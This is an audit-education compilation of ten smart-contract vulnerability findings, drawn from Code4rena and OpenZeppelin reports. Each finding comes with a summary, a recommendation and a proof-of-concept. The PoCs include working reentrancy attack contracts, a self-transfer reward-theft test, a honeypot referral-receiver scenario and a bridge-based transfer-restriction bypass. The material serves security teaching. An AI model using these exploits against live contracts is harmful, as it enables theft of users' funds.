# ETAAcademy-Adudit: 2. Transfer

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>02. Transfer</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>dos</th>
          <td>transfer</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [High] Anyone can steal all distributed rewards

### Self-transfer

- Summary: By executing a self-transfer of tokens while in rebase, an attacker can mint additional tokens for themselves, effectively stealing all distributed rewards until that point. This occurs due to a discrepancy in updating share balances during the transfer process, leading to an incorrect calculation of token balances.
- Impact & Recommendation: Consequently, an attacker can repeatedly exploit this flaw to siphon off rewards intended for other users.To mitigate this issue, preventing self-transfers is recommended to prevent further exploitation and potential loss of funds.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#h-02-anyone-can-steal-all-distributed-rewards) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

  function testSelfTransfer() public {
    token.mint(address(this), 100e18);

    // Mint some tokens to bob and alice
    token.mint(alice, 10e18);
    token.mint(bobby, 10e18);
    // Bob enters the rebase since he wants to earn some profit
    vm.prank(bobby);
    token.enterRebase();
    // Tokens are distributed among all rebase users
    token.distribute(10e18);
    // Nobody claims the rebase rewards for 10 days - just for an example
    // Alice could frontrun every call that changes the unmintedRebaseRewards atomically
    // and claim all the rewards for herself
    vm.warp(block.timestamp + 10 days);
    // --------------------- ATOMIC TX ---------------------
    vm.startPrank(alice);
    token.enterRebase();
    uint256 token_balance_alice_before = token.balanceOf(alice);
    // Here the max she could transfer and steal is the unmintedRebaseRewards() amount
    // but we are using 3e18 just for an example as 3e18 < unmintedRebaseRewards()
    // since there is no public getter for unmintedRebaseRewards
    token.transfer(alice, 3e18);
    token.exitRebase();
    vm.stopPrank();
    uint256 token_balance_alice = token.balanceOf(alice);
    // --------------------- END ATOMIC TX ---------------------
    console.log("Token balance alice before : ", token_balance_alice_before);
    console.log("Token balance alice after  : ", token_balance_alice);
    console.log("--------------------------------------------------");
    console.log("Alice profit credit        : ", token_balance_alice - token_balance_alice_before);
  }


  ```

  </details>

## 2. [Medium] Inability to withdraw funds for certain users due to whenNotPaused modifier in RateLimitedMinter

### EmergencyWithdraw for paused protocol

- Summary: The GUARDIAN role is meant to freeze new protocol usage but allow fund withdrawals. However, the whenNotPaused modifier in the RateLimitedMinter.mint() function prevents users from withdrawing funds if they have CREDIT tokens staked with pending guild rewards. This occurs because the SurplusGuildMinter.unstake() function, called during withdrawal, tries to mint rewards through RateLimitedMinter.mint() by getRewards(), which fails if the protocol is paused.

- Impact & Recommendation: Introduce emergencyWithdraw for users to withdraw funds, excluding rewards when the protocol is paused.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-02-inability-to-withdraw-funds-for-certain-users-due-to-whennotpaused-modifier-in-ratelimitedminter) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    function unstake(address term, uint256 amount) external {
        // apply pending rewards
        (, UserStake memory userStake, bool slashed) = getRewards(
            msg.sender,
            term
        );
    ...


    function getRewards(
        address user,
        address term
    )
        public
        returns (
            uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)
            UserStake memory userStake, // stake state after execution of getRewards()
            bool slashed // true if the user has been slashed
        )
    {
    ...

                // forward rewards to user
            if (guildReward != 0) {
                RateLimitedMinter(rlgm).mint(user, guildReward);
                emit GuildReward(block.timestamp, user, guildReward);
            }
    ...

    function mint(
        address to,
        uint256 amount
    ) external onlyCoreRole(role) whenNotPaused {
        _depleteBuffer(amount); /// check and effects
        IERC20Mintable(token).mint(to, amount); /// interactions
    }


  ```

  </details>

## 3. [Medium] Auction manipulation by block stuffing and reverting on ERC-777 hooks

### Block stuffing attack on the auction

- Summary: A low immutable auction duration set in the deployment script can enable profitable block stuffing attacks on desired Layer 2 (L2) chains. The attacker borrows a loan to receive credit tokens and deposit collateral into the protocol. After the first partial duration, the attacker fails to repay the loan and initiates an auction. The attacker exploits the system by preventing bids until the midpoint, reducing costs, then begins block stuffing to acquire collateral by less credit tokens. Ultimately, the attacker may acquire almost the full loan amount, surpassing the gas cost for block stuffing.

- Impact & Recommendation: The attacker can manipulate the auction to acquire full collateral for almost zero credit tokens, resulting in loss for all stakers on the term. Increasing auction duration and implementing fixes to prevent bad debt from collateral token blacklisting can mitigate such attacks and prevent total loss of stake for lenders.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-16-auction-manipulation-by-block-stuffing-and-reverting-on-erc-777-hooks) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function bid(bytes32 loanId) external {
        ...
        LendingTerm(_lendingTerm).onBid(
            loanId,
            msg.sender,
            auctions[loanId].collateralAmount - collateralReceived, // collateralToBorrower
            collateralReceived, // collateralToBidder
            creditAsked // creditFromBidder
        );
        ...
    }
    function onBid(
        bytes32 loanId,
        address bidder,
        uint256 collateralToBorrower,
        uint256 collateralToBidder,
        uint256 creditFromBidder
    ) external {
        ...
        int256 pnl;
        uint256 interest;
        if (creditFromBidder >= principal) {
            interest = creditFromBidder - principal;
            pnl = int256(interest);
        } else {
            pnl = int256(creditFromBidder) - int256(principal);
            principal = creditFromBidder;
            require(
                collateralToBorrower == 0,
                "LendingTerm: invalid collateral movement"
            );
        }
        ...
        // handle profit & losses
        if (pnl != 0) {
            // forward profit, if any
            if (interest != 0) {
                CreditToken(refs.creditToken).transfer(
                    refs.profitManager,
                    interest
                );
            }
            ProfitManager(refs.profitManager).notifyPnL(address(this), pnl);
        }
        ...
    }
    function notifyPnL(
        address gauge,
        int256 amount
    ) external onlyCoreRole(CoreRoles.GAUGE_PNL_NOTIFIER) {
        ...
        // handling loss
        if (amount < 0) {
            uint256 loss = uint256(-amount);
            // save gauge loss
            GuildToken(guild).notifyGaugeLoss(gauge);
            // deplete the term surplus buffer, if any, and
            // donate its content to the general surplus buffer
            if (_termSurplusBuffer != 0) {
                termSurplusBuffer[gauge] = 0;
                emit TermSurplusBufferUpdate(block.timestamp, gauge, 0);
                _surplusBuffer += _termSurplusBuffer;
            }
            if (loss < _surplusBuffer) {
                // deplete the surplus buffer
                surplusBuffer = _surplusBuffer - loss;
                emit SurplusBufferUpdate(
                    block.timestamp,
                    _surplusBuffer - loss
                );
                CreditToken(_credit).burn(loss);
            }
        } ...
    }
    function notifyGaugeLoss(address gauge) external {
        require(msg.sender == profitManager, "UNAUTHORIZED");
        // save gauge loss
        lastGaugeLoss[gauge] = block.timestamp;
        emit GaugeLoss(gauge, block.timestamp);
    }
    /// @notice apply a loss that occurred in a given gauge
    /// anyone can apply the loss on behalf of anyone else
    function applyGaugeLoss(address gauge, address who) external {
        // check preconditions
        uint256 _lastGaugeLoss = lastGaugeLoss[gauge];
        uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][who];
        require(
            _lastGaugeLoss != 0 && _lastGaugeLossApplied < _lastGaugeLoss,
            "GuildToken: no loss to apply"
        );
        // read user weight allocated to the lossy gauge
        uint256 _userGaugeWeight = getUserGaugeWeight[who][gauge];
        // remove gauge weight allocation
        lastGaugeLossApplied[gauge][who] = block.timestamp;
        _decrementGaugeWeight(who, gauge, _userGaugeWeight);
        if (!_deprecatedGauges.contains(gauge)) {
            totalTypeWeight[gaugeType[gauge]] -= _userGaugeWeight;
            totalWeight -= _userGaugeWeight;
        }
        // apply loss
        _burn(who, uint256(_userGaugeWeight));
        emit GaugeLossApply(
            gauge,
            who,
            uint256(_userGaugeWeight),
            block.timestamp
        );
    }

  ```

  </details>

## 4. [High] Exploitation of the receive Function to Steal Funds

### Reentrancy by receive function

- Summary: The contract has a reentrancy vulnerability due to a flaw in its guard mechanism. Attackers can reset the guard using a receive function, allowing them to execute unauthorized withdrawals. They can deposit ETH, borrows some, then initiates a withdrawal, resetting the guard to pay off their own loan and withdraw additional funds.

- Impact & Recommendation: The vulnerability enables unauthorized fund withdrawals from the contract. The recommendation is to add a reentrancy check to the \_sendValue function to prevent exploitation, without disrupting transfers from the WETH address.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-wise-lending#h-01-exploitation-of-the-receive-function-to-steal-funds) & [Report](https://code4rena.com/reports/2024-02-wise-lending)

  <details><summary>POC</summary>

  ```solidity
    // import ContractA
    import "./ContractA.sol";
    // import MockErc20
    import "./MockContracts/MockErc20.sol";
    contract WiseLendingShutdownTest is Test {
        ...
        ContractA public contractA;
        function _deployNewWiseLending(bool _mainnetFork) internal {
            ...
            contractA = new ContractA(address(FEE_MANAGER_INSTANCE), payable(address(LENDING_INSTANCE)));
            ...
        }
        function testExploitReentrancy() public {
            uint256 depositValue = 10 ether;
            uint256 borrowAmount = 2 ether;
            vm.deal(address(contractA), 2 ether);
            ORACLE_HUB_INSTANCE.setHeartBeat(WETH_ADDRESS, 100 days);
            POSITION_NFTS_INSTANCE.mintPosition();
            uint256 nftId = POSITION_NFTS_INSTANCE.tokenOfOwnerByIndex(address(this), 0);
            LENDING_INSTANCE.depositExactAmountETH{value: depositValue}(nftId);
            LENDING_INSTANCE.borrowExactAmountETH(nftId, borrowAmount);
            vm.prank(address(LENDING_INSTANCE));
            MockErc20(WETH_ADDRESS).transfer(address(FEE_MANAGER_INSTANCE), 1 ether);
            // check contractA balance
            uint ethBalanceStart = address(contractA).balance;
            uint wethBalanceStart = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));
            //total
            uint totalBalanceStart = ethBalanceStart + wethBalanceStart;
            console.log("totalBalanceStart", totalBalanceStart);
            // deposit using contractA
            vm.startPrank(address(contractA));
            LENDING_INSTANCE.depositExactAmountETHMint{value: 2 ether}();
            vm.stopPrank();
        FEE_MANAGER_INSTANCE._increaseFeeTokens(WETH_ADDRESS, 1 ether);

            // withdraw weth using contractA
            vm.startPrank(address(contractA));
            LENDING_INSTANCE.withdrawExactAmount(2, WETH_ADDRESS, 1 ether);
            vm.stopPrank();
            // approve feemanager for 1 weth from contractA
            vm.startPrank(address(contractA));
            MockErc20(WETH_ADDRESS).approve(address(FEE_MANAGER_INSTANCE), 1 ether);
            vm.stopPrank();
            // borrow using contractA
            vm.startPrank(address(contractA));
            LENDING_INSTANCE.borrowExactAmount(2,  WETH_ADDRESS, 0.5 ether);
            vm.stopPrank();
            // Payback amount
            //499537556593483218
            // withdraw using contractA
            vm.startPrank(address(contractA));
            LENDING_INSTANCE.withdrawExactAmountETH(2, 0.99 ether);
            vm.stopPrank();
            // check contractA balance
            uint ethBalanceAfter = address(contractA).balance;
            uint wethBalanceAfter = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));
            //total
            uint totalBalanceAfter = ethBalanceAfter + wethBalanceAfter;
            console.log("totalBalanceAfter", totalBalanceAfter);
            uint diff = totalBalanceAfter - totalBalanceStart;
            assertEq(diff > 5e17, true, "ContractA profit greater than 0.5 eth");
        }
    // SPDX-License-Identifier: -- WISE --
    pragma solidity =0.8.24;
    // import lending and fees contracts
    import "./WiseLending.sol";
    import "./FeeManager/FeeManager.sol";
    contract ContractA {
        address public feesContract;
        address payable public lendingContract;
        address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        constructor(address _feesContract, address payable _lendingContract) payable {
            feesContract = _feesContract;
            lendingContract = _lendingContract;
        }
        fallback() external payable {
            if (msg.sender == lendingContract) {
                // send lending contract 0.01 eth to reset reentrancy flag
                (bool sent, bytes memory data) = lendingContract.call{value: 0.01 ether}("");
                //paybackBadDebtForToken
                FeeManager(feesContract).paybackBadDebtForToken(2, WETH_ADDRESS, WETH_ADDRESS, 499537556593483218);
            }
        }
    }


  ```

  </details>

## 5. [High] Player can mint more fighter NFTs during claim of rewards by leveraging reentrancy on the claimRewards() function

### Reentrancy by roundId

- Summary: A reentrancy vulnerability in the `claimRewards` function allows a malicious user to mint more fighter NFTs than they are entitled to. By using a smart contract, a user can repeatedly reenter the function during the reward claim process, resulting in excessive minting of NFTs stems from the `roundId`.
- Impact & Recommendation: Use a `nonReentrant` modifier for the `claimRewards` function.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-ai-arena#h-08-player-can-mint-more-fighter-nfts-during-claim-of-rewards-by-leveraging-reentrancy-on-the-claimrewards-function) & [Report](https://code4rena.com/reports/2024-02-ai-arena)

  <details><summary>POC</summary>

  ```solidity
    import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
    contract Attack is IERC721Receiver {

        address owner;
        uint256 tickets = 0;
        MergingPool mergingPool;
        FighterFarm fighterFarm;
        constructor(address mergingPool_, address fighterFarm_) {
            mergingPool = MergingPool(mergingPool_);
            fighterFarm = FighterFarm(fighterFarm_);
            owner = msg.sender;
        }
        function reenter() internal {
            ++tickets;
            if (tickets < 100) {
                (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();
                mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);
            }
        }
        function onERC721Received(address, address, uint256 tokenId, bytes calldata) public returns (bytes4) {
            reenter();
            return IERC721Receiver.onERC721Received.selector;
        }
        function attack() public {
            (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();
            mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);
        }
        function setInformation() public pure returns (string[] memory, string[] memory, uint256[2][] memory) {
            string[] memory _modelURIs = new string[](3);
            _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
            _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
            _modelURIs[2] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
            string[] memory _modelTypes = new string[](3);
            _modelTypes[0] = "original";
            _modelTypes[1] = "original";
            _modelTypes[2] = "original";
            uint256[2][] memory _customAttributes = new uint256[2][](3);
            _customAttributes[0][0] = uint256(1);
            _customAttributes[0][1] = uint256(80);
            _customAttributes[1][0] = uint256(1);
            _customAttributes[1][1] = uint256(80);
            _customAttributes[2][0] = uint256(1);
            _customAttributes[2][1] = uint256(80);
            return (_modelURIs, _modelTypes, _customAttributes);
        }
    }

  ```

  ```solidity
      function testReenterPOC() public {
        address Bob = makeAddr("Bob");
        Attack attacker = new Attack(address(_mergingPoolContract), address(_fighterFarmContract));

        _mintFromMergingPool(address(attacker));
        _mintFromMergingPool(Bob);
        assertEq(_fighterFarmContract.ownerOf(0), address(attacker));
        assertEq(_fighterFarmContract.ownerOf(1), Bob);
        uint256[] memory _winners = new uint256[](2);
        _winners[0] = 0;
        _winners[1] = 1;
         // winners of roundId 0 are picked
        _mergingPoolContract.pickWinner(_winners);
        assertEq(_mergingPoolContract.isSelectionComplete(0), true);
        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == address(attacker), true);
        // winner matches ownerOf tokenId
        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == Bob, true);
        string[] memory _modelURIs = new string[](2);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";

        string[] memory _modelTypes = new string[](2);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](2);
        _customAttributes[0][0] = uint256(1);
        _customAttributes[0][1] = uint256(80);
        _customAttributes[1][0] = uint256(1);
        _customAttributes[1][1] = uint256(80);
        // winners of roundId 1 are picked
        uint256 numberOfRounds = _mergingPoolContract.roundId();
        console.log("Number of Rounds: ", numberOfRounds);
        _mergingPoolContract.pickWinner(_winners);
        _mergingPoolContract.pickWinner(_winners);
        console.log("------------------------------------------------------");
        console.log("Balance of attacker (Alice) address pre-claim rewards: ", _fighterFarmContract.balanceOf(address(attacker)));
        // console.log("Balance of Bob address pre-claim rewards: ", _fighterFarmContract.balanceOf(Bob));
        uint256 numRewardsForAttacker = _mergingPoolContract.getUnclaimedRewards(address(attacker));

        // uint256 numRewardsForBob = _mergingPoolContract.getUnclaimedRewards(Bob);
        console.log("------------------------------------------------------");
        console.log("Number of unclaimed rewards attacker (Alice) address has a claim to: ", numRewardsForAttacker);
        // console.log("Number of unclaimed rewards Bob address has a claim to: ", numRewardsForBob);

        // vm.prank(Bob);
        // _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);
        vm.prank(address(attacker));
        attacker.attack();
        uint256 balanceOfAttackerPostClaim = _fighterFarmContract.balanceOf(address(attacker));
        console.log("------------------------------------------------------");
        console.log("Balance of attacker (Alice) address post-claim rewards: ", balanceOfAttackerPostClaim);
        // console.log("Balance of Bob address post-claim rewards: ", _fighterFarmContract.balanceOf(Bob));
    }

  ```

  </details>

## 6.[Medium] Potential arbitrage opportunity in the xRenzoDeposit L2 contract

### Arbitrage

- Summary: In the xRenzoDeposit L2 contract, the sendPrice function updates the price of ezETH to ETH, which is then received by other contracts on Layer 2 (L2). However, a potential arbitrage opportunity exists where a user can monitor the L1 mempool for the sendPrice function call, observe the new price, and exploit it by minting xezETH on L2 before the price adjustment takes effect.

- Impact & Recommendation: Implementing two fees for L2 deposits may mitigate this issue. Additionally, as ezETH tends to be stable, significant price fluctuations are less common. Continuous monitoring and adjusting the update frequency may be necessary to prevent exploitation.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-renzo#m-10-potential-arbitrage-opportunity-in-the-xrenzodeposit-l2-contract) & [Report](https://code4rena.com/reports/2024-04-renzo)

  <details><summary>POC</summary>

  ```solidity
      /**
     * @notice  Exposes the price via getRate()
     * @dev     This is required for a balancer pool to get the price of ezETH
     * @return  uint256  .
     */
    function getRate() external view override returns (uint256) {
        return lastPrice;
    }

  ```

  </details>

## 7.[Medium] Malicious Actor Can Steal Deposits of Tokens With Sender Hooks or Cause Lock Of Funds

### Reentrancy hooks

- Summary: The depositERC20 function is vulnerable to reentrancy attacks with tokens that implement sender hooks. An attacker can exploit this by reentering the function during token transfer, depositing tokens multiple times without triggering the reentrancy check. This results in an inflated deposited balance. Consequently, the attacker could withdraw more tokens than deposited, or the contract might lock funds if it lacks sufficient tokens to cover the inflated balance.

- Impact & Recommendation: To prevent this, it is recommended to add reentrancy guards to both the depositERC20 and depositETH functions.
  <br> 🐬: [Source](https://blog.openzeppelin.com/scroll-batch-token-bridge-audit#malicious-actor-can-steal-deposits-of-tokens-with-sender-hooks-or-cause-lock-of-funds) & [Report](https://blog.openzeppelin.com/scroll-batch-token-bridge-audit)

<details><summary>POC</summary>

```solidity
    }

    /// @notice Deposit ETH.
    function depositETH() external payable nonReentrant {
        // no safe cast check here, since no one has so much ETH yet.
        _deposit(address(0), _msgSender(), uint96(msg.value));
    }
	@@ -218,7 +218,7 @@ contract L1BatchBridgeGateway is AccessControlEnumerableUpgradeable, ReentrancyG
    ///
    /// @param token The address of token.
    /// @param amount The amount of token to deposit. We use type `uint96`, since it is enough for most of the major tokens.
    function depositERC20(address token, uint96 amount) external nonReentrant {
        if (token == address(0)) revert ErrorIncorrectMethodForETHDeposit();

        // common practice to handle fee on transfer token.
	@@ -345,7 +345,7 @@ contract L1BatchBridgeGateway is AccessControlEnumerableUpgradeable, ReentrancyG
        address token,
        address sender,
        uint96 amount
    ) internal {
        BatchConfig memory cachedBatchConfig = configs[token];
        TokenState memory cachedTokenState = tokens[token];
        _tryFinalizeCurrentBatch(token, cachedBatchConfig, cachedTokenState);

```

</details>

## 8.[High] Attack to make CurveSubject to be a HoneyPot

### Honeypot

- Summary: A vulnerability in the Curves contract allows malicious creators to turn any CurveSubject into a honeypot, where users can buy but cannot sell tokens. This is due to the referralFeeDestination call always being executed, even if the referral fee is zero. Malicious creators can set a custom referralFeeDestination contract that rejects sell transactions. This contract, EvilReferralFeeReceiver, blocks sells by reverting transactions if the user's token balance decreases.

- Impact & Recommendation: It is recommended to use Solady’s forceSafeTransferETH() for safer ETH transfers. This issue is confirmed and deemed high severity as it requires significant effort to prevent scammers from exploiting it.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-curves#h-03-attack-to-make-curvesubject-to-be-a-honeypot) & [Report](https://code4rena.com/reports/2024-01-curves)

<details><summary>POC</summary>

```solidity
import { expect, use } from "chai";
import { solidity } from "ethereum-waffle";
use(solidity);
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
//@ts-ignore
import { ethers } from "hardhat";
import { type Curves } from "../contracts/types";
import { buyToken } from "../tools/test.helpers";
import { deployCurveContracts } from "./test.helpers";
describe("Make Curve Subject To Be A Honey Pot test", () => {
  let testContract;
  let evilReferralFeeReceiver;
  let owner: SignerWithAddress, evilSubjectCreator: SignerWithAddress,
      alice: SignerWithAddress, bob: SignerWithAddress, others: SignerWithAddress[];
  beforeEach(async () => {
    testContract = await deployCurveContracts();
    [owner, evilSubjectCreator, alice, bob, others] = await ethers.getSigners();
    const EvilReferralFeeReceiver = await ethers.getContractFactory("EvilReferralFeeReceiver");
    evilReferralFeeReceiver = await EvilReferralFeeReceiver.connect(evilSubjectCreator).deploy();
  });
  it("While 'HONEY POT' mode enabled, users can only buy, but can't sell any Curve token ", async () => {
    // 1. The evil create a subject and set a normal referral fee receiver
    await testContract.connect(evilSubjectCreator).mint(evilSubjectCreator.address);
    await testContract.connect(evilSubjectCreator).setReferralFeeDestination(
      evilSubjectCreator.address, evilSubjectCreator.address
    );
    // 2. The evil buy enough tokens at low price
    await buyToken(testContract, evilSubjectCreator, evilSubjectCreator, 1);
    await buyToken(testContract, evilSubjectCreator, evilSubjectCreator, 10);
    // 3. victims buy or sell tokens normally
    await buyToken(testContract, evilSubjectCreator, alice, 10);
    await testContract.connect(alice).sellCurvesToken(evilSubjectCreator.address, 5);
    await buyToken(testContract, evilSubjectCreator, bob, 10);
    await testContract.connect(bob).sellCurvesToken(evilSubjectCreator.address, 5);
    // 4. at some time point, the evil enables 'HONEY POT' mode by updating the referral fee receiver
    await testContract.connect(evilSubjectCreator).setReferralFeeDestination(
      evilSubjectCreator.address, evilReferralFeeReceiver.address
    );
    await evilReferralFeeReceiver.connect(evilSubjectCreator).setCurvesAndSubject(
      testContract.address, evilSubjectCreator.address
    );
    await evilReferralFeeReceiver.connect(evilSubjectCreator).updateBalances(
      [alice.address, bob.address]
    );
    // 5. now, victims can buy, but can't sell
    await buyToken(testContract, evilSubjectCreator, alice, 1);
    let tx = testContract.connect(alice).sellCurvesToken(evilSubjectCreator.address, 1);
    expect(tx).to.revertedWith("CannotSendFunds()");
    // 6. but the evil can sell tokens normally, of course at a higher price than buy and make profit
    await  evilReferralFeeReceiver.connect(evilSubjectCreator).setAllowList(
      evilSubjectCreator.address, true
    );
    testContract.connect(evilSubjectCreator).sellCurvesToken(evilSubjectCreator.address, 11);
  });
});

```

</details>

## 9.[High] The attackers front-running repayloans so that the debt cannot be repaid

### frontrun on loan operations

- Summary: Attackers can exploit a front-running attack on the repayLoan function, causing the debt repayment to fail and leading to the liquidation of the borrower’s collateral. An attacker can front-run the repayLoan call by executing mergeTranches or addNewTranche, which alters the loan ID in `_loans`. This makes it impossible for the borrower to repay their loan, potentially causing collateral to be liquidated.

- Impact & Recommendation: Avoid deleting or updating the `_loanId` in a way that affects ongoing loan operations. Alternatively, consider restricting functions that modify loan IDs near the loan's expiry to prevent such attacks.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-gondi#h-010-The-attackers-front-running-repayloans-so-that-the-debt-cannot-be-repaid) & [Report](https://code4rena.com/reports/2024-04-gondi)

<details><summary>POC</summary>

```solidity
    function repayLoan(LoanRepaymentData calldata _repaymentData) external override nonReentrant {
        uint256 loanId = _repaymentData.data.loanId;
        Loan calldata loan = _repaymentData.loan;
        .....
@>      _baseLoanChecks(loanId, loan);
        .....
    }

    function _baseLoanChecks(uint256 _loanId, Loan memory _loan) private view {
        if (_loan.hash() != _loans[_loanId]) {
            revert InvalidLoanError(_loanId);
        }
        if (_loan.startTime + _loan.duration < block.timestamp) {
            revert LoanExpiredError();
        }
    }

```

</details>

## 10.[High] The user can send tokens to any address by using two bridge transfers, even when transfers are restricted.

### Bypass transfer restrictions

- Summary: In the TITN contract users could bypass transfer restrictions by using bridge operations. Although direct transfers were restricted when `isBridgedTokensTransferLocked` was enabled (allowing only transfers to a specific contract or LayerZero endpoint), bridge operations used mint and burn functions instead of transfer/transferFrom, thus avoiding the restriction. By bridging tokens to themselves on another chain and then bridging again to a target address, users could effectively transfer TITN tokens to any address, violating intended controls designed to prevent early trading before the token generation event (TGE).

- Impact & Recommendation: A fix was implemented to restrict bridge transfers so that users can only bridge tokens to their own addresses.
  <br> 🐬: [Source](https://code4rena.com/reports/2025-02-thorwallet#h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted) & [Report](https://code4rena.com/reports/2025-02-thorwallet)

<details><summary>POC</summary>

```javascript

        it('user1  transfer TITN tokens to user2 by bridge when transfer disable', async function () {
            // transfer TGT to the merge contract
            await tgt.connect(user1).approve(mergeTgt.address, ethers.utils.parseUnits('100', 18))
            await tgt.connect(user1).transferAndCall(mergeTgt.address, ethers.utils.parseUnits('100', 18), '0x')
            // claim TITN
            const claimableAmount = await mergeTgt.claimableTitnPerUser(user1.address)
            await mergeTgt.connect(user1).claimTitn(claimableAmount)
            // attempt to transfer TITN (spoiler alert: it should fail)
            try {
                await arbTITN.connect(user1).transfer(user2.address, ethers.utils.parseUnits('1', 18))
                expect.fail('Transaction should have reverted')
            } catch (error: any) {
                expect(error.message).to.include('BridgedTokensTransferLocked')
            }


            // Minting an initial amount of tokens to ownerA's address in the TITN contract
            const initialAmount = ethers.utils.parseEther('1000000000')
            // Defining the amount of tokens to send and constructing the parameters for the send operation
            const tokensToSend = ethers.utils.parseEther('1')
            // Defining extra message execution options for the send operation
            const options = Options.newOptions().addExecutorLzReceiveOption(200000, 0).toHex().toString()
            const sendParam = [
                eidA,
                ethers.utils.zeroPad(user1.address, 32),
                tokensToSend,
                tokensToSend,
                options,
                '0x',
                '0x',
            ]

            // Fetching the native fee for the token send operation
            const [nativeFee] = await arbTITN.quoteSend(sendParam, false)
            // Executing the send operation from TITN contract
            const startBalanceBOnBase = await baseTITN.balanceOf(user1.address)

            await arbTITN.connect(user1).send(sendParam, [nativeFee, 0], user1.address, { value: nativeFee })
            const finalBalanceBOnBase = await baseTITN.balanceOf(user1.address)
            expect(startBalanceBOnBase).to.eql(ethers.utils.parseEther('0'))
            expect(finalBalanceBOnBase.toString()).to.eql(tokensToSend.toString())

            // Fetching the native fee for the token send operation
            const sendParam2 = [
                eidB,
                ethers.utils.zeroPad(user2.address, 32),
                tokensToSend,
                tokensToSend,
                options,
                '0x',
                '0x',
            ]

            const [nativeFee2] = await baseTITN.quoteSend(sendParam2, false)
            const startBalanceBOnArb = await arbTITN.balanceOf(user2.address)
            await baseTITN.connect(user1).send(sendParam2, [nativeFee, 0], user2.address, { value: nativeFee2 })
            const finalBalanceBOnArb = await arbTITN.balanceOf(user2.address)

            console.log("before user2 balance: ", startBalanceBOnArb);
            console.log("after user2 balance: ", finalBalanceBOnArb);

            expect(startBalanceBOnArb).to.eql(ethers.utils.parseEther('0'))
            expect(finalBalanceBOnArb.toString()).to.eql(tokensToSend.toString())

        })

```

</details>
